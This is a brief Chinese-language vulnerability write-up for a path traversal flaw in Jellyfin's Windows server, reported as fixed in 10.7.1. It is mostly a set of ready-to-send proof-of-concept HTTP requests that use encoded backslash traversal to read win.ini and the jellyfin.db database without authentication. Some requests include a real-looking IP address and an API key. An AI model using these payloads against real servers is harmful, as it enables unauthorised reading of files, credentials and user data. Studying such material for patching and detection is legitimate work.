### 描述
JellyFin的Windows端服务器不会对特定路径进行鉴权，可以导致攻击者利用Windows上的路径穿越来读取Windows服务器上的任意文件。本漏洞于2021年3月28日在最近版本的10.7.1中被修复。

### POC
```
# poc_1
GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
Host:xxx.xxx.xxx.xxx
Content-Type: application/octet-stream

# poc_2
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x:5577
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: */*
Referer: http://110.93.247.208:5577/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

# poc_3
GET /Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/ HTTP/1.1
Host: xxx.xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: */*
Referer: http://110.93.247.208:5577/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

# 其他poc
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
```
